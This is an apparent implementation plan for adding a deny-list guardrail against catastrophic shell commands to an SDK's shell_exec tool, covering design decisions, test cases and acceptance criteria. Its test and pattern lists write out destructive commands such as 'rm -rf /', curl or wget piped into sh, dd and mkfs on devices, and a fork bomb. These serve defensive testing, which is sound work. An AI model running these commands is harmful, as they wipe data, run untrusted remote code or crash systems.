---
slug: m3-catastrophic-shell
created_at: 2026-06-20
goal: Add a catastrophic-command guardrail to sdk-tools shell_exec — catastrophicShellReason(cmd) segment-aware deny-list (rm -rf root, curl-into-sh, mkfs, dd-of-device, fork bomb, force-push, chmod 777 root; chains + sudo) wired default-on into createShellTool, measured by tests/shell-guard.test.ts + tests/shell-exec.test.ts passing green.
---

# Plan: M3-2 — Catastrophic-shell guard

> **Version 1.1** (edge-case-plan absorbed: EC-1 fork-bomb-whole-match + EC-2 rm-target-variants folded into T1.1 TDD) — Close the unguarded `shell_exec` in `@theokit/sdk-tools`: a pure `catastrophicShellReason(cmd): string | null` segment-aware deny-list (split on `;`/`&&`/`||`/pipe; strip `sudo`/`env` prefix; command-position match) blocking `rm -rf` of root/home/glob, `curl|wget` into `sh`/`bash`, `mkfs`, `dd` of a device, `:(){` fork bomb, `git push --force`, `chmod -R 777 /`, `> /dev/sd*` — wired SECURE-BY-DEFAULT into `createShellTool` (opt-out `allowCatastrophic`). A heuristic GUARDRAIL (not a sandbox). Closes roadmap gap M3-2 (high sev). Design locked by blueprint `m3-catastrophic-shell` (discover-confidence SHIPPABLE 100, six ADRs covering signature/pattern-set/segmentation/typed-error/wiring/scope).

## Goal

> "Make `shell_exec` refuse obviously-catastrophic commands (rm -rf of root/home, curl-into-shell, device wipes, fork bombs, force-push) by default — across chains and sudo — measured by `tests/shell-guard.test.ts` + `tests/shell-exec.test.ts` passing green."

## Context

Roadmap gap M3-2 (`docs/gap-audit/ROADMAP.md:122`, high sev, Tema C). `packages/sdk-tools/src/shell-exec.ts:30-141` runs `spawn("/bin/sh",["-c",command])` with NO command screening. The freshest in-repo security primitive is `network-guard` (M3-1, `packages/sdk-tools/src/internal/network-guard.ts`: pure predicate + `SsrfBlockedError extends ConfigurationError` + barrel export + secure-by-default wiring with an opt-out) — the exact pattern this mirrors. codex's `command_safety/` is the deny-list precedent (`rm -rf`, sudo recursion). This ships a GUARDRAIL (heuristic, bypassable, default-on, opt-out) — NOT a sandbox/approval (M3-6 composes it at the agents layer later). Zero new deps (in-house segment tokenizer). Respects `rules/architecture.md` §2 + `rules/no-stubs-no-mocks-no-wired.md`.

## Baseline Context (deep review of current state)

### Files that will be touched

| File | LoC today | Last commit | Why it exists today | Invariants to preserve |
|---|---|---|---|---|
| `packages/sdk-tools/src/internal/shell-guard.ts` (NEW) | 0 | — | (the catastrophic-command guardrail) | — |
| `packages/sdk-tools/src/shell-exec.ts` | 141 | — | `createShellTool` (spawn /bin/sh, no screening) | preserve existing returns; ADD screening |
| `packages/sdk-tools/src/index.ts` | (barrel) | — | sdk-tools exports | additive exports only |
| `packages/sdk-tools/tests/shell-guard.test.ts` (NEW) | 0 | — | unit tests — RED first | — |
| `packages/sdk-tools/tests/shell-exec.test.ts` | 81 | — | shell_exec tests (no screening cases) | additive screening cases |
| `packages/sdk/src/errors.ts` | 698 | — | `ConfigurationError` (extended by `CatastrophicCommandError`) | read-only |
| `docs.md` | (contract) | — | public API contract | additive shell_exec guardrail note |
| `packages/sdk/CHANGELOG.md` (root) + `.changeset/` (NEW) | — | — | changelog + changeset | additive Security entry |

### Current callers / dependents

- **`createShellTool`** (`shell-exec.ts:30`) — exported from the sdk-tools barrel; consumers build coding agents with it. Default-on screening changes behavior (catastrophic commands now blocked) — the intended fix; `allowCatastrophic` opt-out preserved.
- **NEW** `catastrophicShellReason`/`CatastrophicCommandError` — exported from the barrel as reusable primitives (wired into shell-exec + integration-tested → no orphan). M3-6 will compose `catastrophicShellReason` at the agents layer.
- **`ConfigurationError`** (`@theokit/sdk`) — base class; existing peer dep.

### Domain glossary

- **catastrophic command** — a shell command that causes irreversible/system-wide damage (mass delete, device wipe, remote-code-exec, fork bomb, history destruction).
- **segment** — a piece of a command line after splitting on `;`/`&&`/`||`/pipe; each is screened independently.
- **guardrail** — a heuristic deny-list that blocks obvious/accidental catastrophes; NOT a security sandbox (bypassable by obfuscation).
- **command-position match** — matching the executable (first token of a segment) + flags, not an arbitrary substring (avoids over-blocking `echo "rm -rf /"`).

### Architecture boundaries affected

Per `rules/architecture.md` §2: `shell-guard.ts` is a pure domain security primitive in sdk-tools `internal/` (no I/O — string analysis only); it imports `ConfigurationError` (public). Wired at the composition point (`createShellTool`), mirroring `network-guard`.

## Prior Art & Related Work

- **Internal blueprint** `knowledge-base/discoveries/blueprints/m3-catastrophic-shell-blueprint.md` (six ADRs — signature, pattern set, segmentation, typed error, wiring, scope).
- **In-repo pattern** `packages/sdk-tools/src/internal/network-guard.ts` (M3-1 — pure predicate + typed error + secure-by-default + opt-out).
- **Reference precedent** codex `command_safety/is_dangerous_command.rs` (`.claude/knowledge-base/reference/codex/codex-rs/shell-command/src/command_safety/`); opencode approval contrast (`.claude/knowledge-base/reference/opencode/packages/core/src/tool/bash.ts`).

## Objective

- [ ] `shell-guard.ts` exports `catastrophicShellReason(cmd): string | null` + `CatastrophicCommandError`.
- [ ] Blocks the pattern set (rm -rf root/home/glob, curl/wget into sh/bash, mkfs, dd of device, fork bomb, git push --force, chmod -R 777 /, > /dev/sd*).
- [ ] Segment-aware (splits `;`/`&&`/`||`/pipe; strips `sudo`/`env` prefix; command-position match); allows safe commands (`ls`, `echo`, `git status`, `rm -rf ./build`).
- [ ] `createShellTool` screens by default; `allowCatastrophic?:boolean` (default false) opt-out; blocked → `{ok:false,error:"catastrophic_command",reason}`.
- [ ] Zero new deps; barrel exports; docs.md + CHANGELOG + changeset.
- [ ] `tests/shell-guard.test.ts` + `tests/shell-exec.test.ts` green; typecheck + Biome clean.

## ADRs

### D1 — `catastrophicShellReason(cmd): string | null` (reason-returning, segment-aware, pure)
**Decision:** a pure function returning a human reason if any segment is catastrophic, else `null`. Mirrors network-guard's informative typed error.
**Rationale:** a reason powers `{error:"catastrophic_command",reason}` + names the offender; reusable + fully unit-testable (no I/O).
**Alternatives considered:** boolean (rejected — loses reason); throw-only (rejected — the tool returns errors, doesn't throw to the model).

### D2 — Pattern set + relative-path nuance
**Decision:** block the blueprint Technique-1 set. For `rm` with recursive+force, flag targets `/`, `~`, `*`, `.`, env-root, or absent; ALLOW an explicit safe relative path (`rm -rf ./build`).
**Rationale:** codex blocks all `rm -rf` (sandbox backs it); the SDK has no sandbox, so it screens genuinely-catastrophic targets while staying usable; over-block mitigated by the opt-out.
**Alternatives considered:** block ALL `rm -rf` (rejected — cripples legit cleanup); block none (rejected — the gap).

### D3 — Segment splitting + command-position matching
**Decision:** split on top-level `;`/`&&`/`||`/pipe; strip leading `sudo`/`env`/`command`/`time`; match the segment's executable + flags (not arbitrary substring); flag `curl`/`wget` piped into `sh`/`bash`/`zsh`.
**Rationale:** catches chained/sudo/piped catastrophes; minimizes over-block (`echo "rm -rf /"` is safe). codex precedent (sudo recursion + bash-lc parse).
**Alternatives considered:** substring match (rejected — over-blocks); full shell parser (rejected — heavy dep, YAGNI for a guardrail).

### D4 — Typed error + default-on wiring + opt-out
**Decision:** `CatastrophicCommandError extends ConfigurationError` (`code:"catastrophic_command"`). `createShellTool` screens by default; `allowCatastrophic?:boolean` (default false) opt-out; blocked → `{ok:false,error:"catastrophic_command",reason}`.
**Rationale:** secure-by-default mirrors M3-1 `allowPrivateHosts`; typed error matches path-guard/network-guard.
**Alternatives considered:** opt-in (rejected — footgun); no opt-out (rejected — blocks legit power flows).

### D5 — Placement + guardrail scope (not sandbox; POSIX; Windows deferred)
**Decision:** `shell-guard.ts` in sdk-tools `internal/`, barrel-exported. A heuristic guardrail (bypassable), POSIX `/bin/sh` only; sandbox/approval + Windows PowerShell out of scope (documented). M3-6 composes it at the agents layer.
**Rationale:** tool-specific guardrail next to its consumer; matches the roadmap ("guardrail, não sandbox") + the repo's POSIX runtime; honest about limits.
**Alternatives considered:** claim full protection (rejected — dishonest); Windows patterns now (rejected — repo runs /bin/sh; YAGNI).

## Drawbacks & Risks

| Drawback / Risk | Severity | Mitigation | Owner |
|---|---|---|---|
| Behavior change — agents running catastrophic commands now get `catastrophic_command` | Medium | `allowCatastrophic:true` opt-out; CHANGELOG documents it; it is the intended fix | SDK |
| A deny-list is bypassable (obfuscation via eval/base64) — not a security boundary | Medium | documented as a GUARDRAIL (ADR D5); real isolation is a separate concern (sandbox, M3-6 agents-layer) | SDK |
| Over-block on legit commands that resemble a pattern | Low | command-position matching (not substring) + the opt-out; tested with safe-command cases | SDK |

## Unresolved Questions

- (none — every decision resolved at plan time via the blueprint's six ADRs. Windows PowerShell patterns + agents-layer composition (`isCommandAllowed`) are explicitly deferred to a later milestone — YAGNI here.)

## Dependency Graph

```
Phase 1 (catastrophicShellReason + CatastrophicCommandError) ──▶ Phase 2 (wire into createShellTool + export + docs) ──▶ Final Phase (integration validation)
```

---

## Phase 1: The guardrail primitive

### T1.1 — `catastrophicShellReason` + `CatastrophicCommandError`

#### Objective
Create `internal/shell-guard.ts` with the pure segment-aware deny-list + typed error.

#### Why this step (action + reasoning)
1. **What** — the pure guardrail: segment-split + command-position pattern matching, returning a reason or null.
2. **Why now** — it is the load-bearing correctness surface (every pattern + chaining/sudo/pipe case) and is fully unit-testable without spawning anything.

#### Evidence
Blueprint D1/D2/D3 + Technique 1/2. codex `is_dangerous_command.rs:149,152`. Pattern to mirror: `network-guard.ts:20-141`. `ConfigurationError` (`packages/sdk/src/errors.ts:205`).

#### Files to edit
```
packages/sdk-tools/src/internal/shell-guard.ts — NEW: catastrophicShellReason, CatastrophicCommandError
packages/sdk-tools/tests/shell-guard.test.ts — NEW: RED tests first
```

#### Deep file dependency analysis
- `shell-guard.ts` imports `ConfigurationError` from `@theokit/sdk`. No other file changes this task. No production caller yet (wired in T2.1).

#### Pseudo-code / Signatures
```pseudocode
class CatastrophicCommandError extends ConfigurationError  // code:"catastrophic_command"
function splitSegments(cmd): string[]   // split on ; && || | (top-level), trim
function stripPrefix(seg): string       // drop leading sudo/env/command/time tokens
function catastrophicShellReason(cmd: string): string | null
  for seg in splitSegments(cmd):
    s = stripPrefix(seg); argv = tokenize(s)
    cmd0 = basename(argv[0])
    if cmd0=="rm" && hasRecursiveForce(argv) && unsafeRmTarget(argv): return "rm -rf of a root/home/glob path"
    if (cmd0 in {curl,wget}) && pipedIntoShell(cmd): return "curl/wget piped into a shell"
    if cmd0.startsWith("mkfs"): return "mkfs on a device"
    if cmd0=="dd" && argvHas("of=/dev/"): return "dd writing to a device"
    if isForkBomb(cmd): return "fork bomb"
    if cmd0=="git" && argv has push && (--force|-f) && not --force-with-lease: return "git push --force"
    if cmd0=="chmod" && recursive && target root: return "chmod -R on root"
    if redirectsToDevice(seg): return "redirect to a device"
  return null
```

#### TDD
```
RED: test_blocks_rm_rf_root() — "rm -rf /" / "rm -rf ~" / "rm -fr /*" → reason
RED: test_blocks_rm_rf_root_variants() — "rm -rf //" / "rm -rf \"/\"" / "rm -rf / " → reason (edge EC-2)
RED: test_blocks_rm_rf_via_chain() — "ls && rm -rf /" → reason (edge EC-1)
RED: test_blocks_rm_rf_via_sudo() — "sudo rm -rf /" → reason (edge EC-1)
RED: test_allows_rm_rf_relative() — "rm -rf ./build" / "rm -rf node_modules" → null (D2)
RED: test_blocks_curl_pipe_sh() — "curl http://x | sh" / "wget -O- u | bash" → reason (edge EC-2)
RED: test_blocks_mkfs() — "mkfs.ext4 /dev/sda" → reason
RED: test_blocks_dd_to_device() — "dd if=/dev/zero of=/dev/sda" → reason
RED: test_blocks_fork_bomb() — ":(){ :|:& };:" → reason
RED: test_blocks_git_force_push() — "git push --force" / "git push -f origin main" → reason
RED: test_allows_force_with_lease() — "git push --force-with-lease" → null
RED: test_blocks_chmod_777_root() — "chmod -R 777 /" → reason
RED: test_allows_safe_commands() — "ls -la", "echo hi", "git status", "cat f" → null
RED: test_does_not_overblock_mention() — "echo \"rm -rf /\"" → null (command-position, edge EC-4)
GREEN: implement shell-guard.ts
REFACTOR: Biome complexity ≤ 10 (extract per-pattern checks)
VERIFY: pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-guard.test.ts
```

#### Acceptance Criteria
- [ ] `pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-guard.test.ts` reports 14/14 tests passed
- [ ] `test_blocks_rm_rf_via_chain` + `test_blocks_rm_rf_via_sudo` pass (segment/sudo, ADR D3)
- [ ] `test_blocks_curl_pipe_sh` passes (pipe-to-shell, ADR D3)
- [ ] `test_does_not_overblock_mention` passes (command-position, ADR D3)
- [ ] `test_allows_rm_rf_relative` passes (D2 nuance)
- [ ] `pnpm --filter @theokit/sdk-tools exec biome check packages/sdk-tools/src/internal/shell-guard.ts` reports 0 errors

#### DoD
- [ ] those tests green; `pnpm --filter @theokit/sdk-tools typecheck` exits 0

---

## Phase 2: Wire into `shell_exec` + export

### T2.1 — Secure-by-default `createShellTool` + barrel export + docs

#### Objective
Wire `catastrophicShellReason` into `createShellTool` (default-on, `allowCatastrophic` opt-out) + export the primitives + integration tests + docs + changeset + CHANGELOG.

#### Why this step (action + reasoning)
1. **What** — screen `command` before spawn; add `allowCatastrophic` to options; return `{ok:false,error:"catastrophic_command",reason}`; export `catastrophicShellReason`/`CatastrophicCommandError`.
2. **Why now** — per `no-stubs-no-mocks-no-wired.md` the primitive needs a real caller; per CLAUDE.md docs.md reflects the public-surface change.

#### Evidence
`shell-exec.ts:30-55` (options + handler), `:62-64` (spawn — screen before it). Blueprint D4/D5. network-guard wiring precedent (M3-1).

#### Files to edit
```
packages/sdk-tools/src/shell-exec.ts — screen before spawn + allowCatastrophic + catastrophic_command return
packages/sdk-tools/src/index.ts — export catastrophicShellReason, CatastrophicCommandError
packages/sdk-tools/tests/shell-exec.test.ts — integration cases
docs.md — shell_exec guardrail note
packages/sdk/CHANGELOG.md (root) — [Unreleased] § Security entry
.changeset/m3-catastrophic-shell.md — NEW minor changeset
```

#### Deep file dependency analysis
- `shell-exec.ts` imports from `./internal/shell-guard.js`; the handler screens `command` first. `index.ts` additive exports. shell-exec tests add screening cases (deterministic — no real catastrophic command is ever spawned; the screen returns before spawn).

#### TDD
```
RED: test_shell_exec_blocks_rm_rf_root() — createShellTool({projectRoot}).handler({command:"rm -rf /"}) → {ok:false,error:"catastrophic_command"}
RED: test_shell_exec_blocks_curl_pipe_sh() — command "curl http://x | sh" → catastrophic_command
RED: test_shell_exec_allows_safe() — command "echo hi" → {ok:true,...} (regression — existing behavior)
RED: test_shell_exec_allowCatastrophic_opt_out() — createShellTool({projectRoot, allowCatastrophic:true}).handler({command:"rm -rf /nonexistent-xyz"}) → NOT catastrophic_command (runs, returns ok/exec result)
RED: test_shell_guard_symbols_exported() — import { catastrophicShellReason, CatastrophicCommandError } from sdk-tools barrel → defined
GREEN: wire screen + allowCatastrophic + barrel exports + docs + changeset + CHANGELOG
REFACTOR: keep handler complexity within budget
VERIFY: pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-exec.test.ts
```

#### Acceptance Criteria
- [ ] `pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-exec.test.ts` reports all tests passed (existing + 5 new)
- [ ] `test_shell_exec_blocks_rm_rf_root` passes (the headline fix)
- [ ] `test_shell_exec_allowCatastrophic_opt_out` passes (opt-out, ADR D4)
- [ ] `test_shell_guard_symbols_exported` passes (barrel)
- [ ] `grep -c "catastrophic" docs.md` returns ≥ 1 AND `ls .changeset/m3-catastrophic-shell.md` exists AND `grep -c "catastrophic" packages/sdk/CHANGELOG.md` ≥ 1
- [ ] `pnpm --filter @theokit/sdk-tools exec biome check` clean on changed files

#### DoD
- [ ] shell-exec tests green; typecheck exit 0; `pnpm --filter @theokit/sdk-tools build` succeeds; docs/changeset/CHANGELOG present

---

## Coverage Matrix

| # | Gap / Requirement | Task(s) | Resolution |
|---|---|---|---|
| 1 | No command screening (M3-2) | T1.1 | `catastrophicShellReason` segment-aware deny-list (D1/D3) |
| 2 | Catastrophic pattern set | T1.1 | rm-rf-root/curl-pipe-sh/mkfs/dd/fork-bomb/force-push/chmod-777 (D2) |
| 3 | Chains + sudo + pipe evasion | T1.1 | segment split + sudo strip + pipe-to-shell (D3) |
| 4 | shell_exec unguarded | T2.1 | secure-by-default `createShellTool` + `allowCatastrophic` opt-out (D4) |
| 5 | Typed error | T1.1 | `CatastrophicCommandError extends ConfigurationError` |
| 6 | Zero new deps | T1.1 | in-house tokenizer (D5/Rule 9) |
| 7 | Over-block avoidance | T1.1 | command-position matching (D3) |
| 8 | Document + record + export | T2.1 | barrel + docs.md + changeset + CHANGELOG + integration tests |

**Coverage: 8/8 gaps covered (100%)**

## Global Definition of Done

- [ ] All phases completed
- [ ] All tests passing — `pnpm --filter @theokit/sdk-tools exec vitest run` green
- [ ] Zero type errors — `pnpm --filter @theokit/sdk-tools typecheck`
- [ ] Zero lint warnings — `pnpm --filter @theokit/sdk-tools exec biome check`
- [ ] Dead-code clean — `pnpm quality:dead` (knip)
- [ ] Build clean — `pnpm --filter @theokit/sdk-tools build`
- [ ] File-size budget respected (`shell-guard.ts` ≤ 500, target ≤ 160)
- [ ] CHANGELOG.md updated under `[Unreleased]` + changeset added (Unbreakable Rule 6)
- [ ] Backward compatibility: documented behavior change (catastrophic now blocked) + `allowCatastrophic` opt-out
- [ ] `docs.md` reflects the shell_exec guardrail
- [ ] Plan-specific: rm -rf root/home/glob blocked (relative allowed); chains + sudo caught; curl-pipe-sh blocked; safe commands + mentions not over-blocked; guardrail (not sandbox) documented
- [ ] Plan archived after `/review` READY_TO_MERGE + PR merge

## Dependencies

M3-2 introduces ZERO new dependencies — an in-house segment tokenizer (no shell-parser lib) + `ConfigurationError` (Rule 9 / KISS).

### Existing — use as-is

| Package | Version | Ecosystem | Why |
|---|---|---|---|
| `@theokit/sdk` (`ConfigurationError`, `CustomTool`, `defineTool`) | workspace | npm/TS | error base + tool contract (existing peer dep) |
| `zod` | existing | npm/TS | input schema (already used) |

### New — to be introduced

| Package | Version | Ecosystem | Rule 9 rationale | Why this one |
|---|---|---|---|---|
| (none) | — | — | A shell-parser lib (e.g. `shell-quote`) was evaluated + rejected: a guardrail needs only top-level segment splitting + command-position matching (~80 lines), not a full grammar; codex uses a heavy Rust parser not portable here; avoids a transitive dep on a security path. | n/a — in-house tokenizer |

### Removed

| Package | Last version | Why removed |
|---|---|---|
| (none) | | |

## Failure scenarios

`catastrophicShellReason` is pure (no I/O) — it cannot fail at runtime; a parse ambiguity defaults to NOT matching (the guardrail is best-effort, documented as bypassable). The screen runs BEFORE spawn, so a blocked command never executes (fails closed for the catastrophic set). `createShellTool`'s existing failure modes (timeout, exec_failed) are unchanged.

## Final Phase: Integration Validation (MANDATORY)

### Execution
```
pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-guard.test.ts tests/shell-exec.test.ts
pnpm --filter @theokit/sdk-tools exec vitest run        # full sdk-tools suite — no regression
pnpm --filter @theokit/sdk-tools typecheck
pnpm --filter @theokit/sdk-tools exec biome check
pnpm quality:dead
pnpm --filter @theokit/sdk-tools build
```

### Acceptance Criteria
- [ ] `pnpm --filter @theokit/sdk-tools exec vitest run tests/shell-guard.test.ts tests/shell-exec.test.ts` reports 19 new tests passed (0 failed)
- [ ] `pnpm --filter @theokit/sdk-tools exec vitest run` exits 0 with 0 failed tests (full suite, no regression)
- [ ] `pnpm --filter @theokit/sdk-tools typecheck` exits 0 (0 type errors) and `pnpm --filter @theokit/sdk-tools exec biome check` reports 0 warnings
- [ ] `pnpm quality:dead` reports 0 unused exports for `catastrophicShellReason`/`CatastrophicCommandError` (new exports not orphan)
- [ ] `pnpm --filter @theokit/sdk-tools build` succeeds
- [ ] Runtime-metric proof — N/A (pure guardrail; observable via the `catastrophic_command` error result)

### If Validation Fails
1. Identify plan-caused vs pre-existing failures. 2. Fix all plan-caused. 3. Re-run. 4. Log pre-existing in the PR.
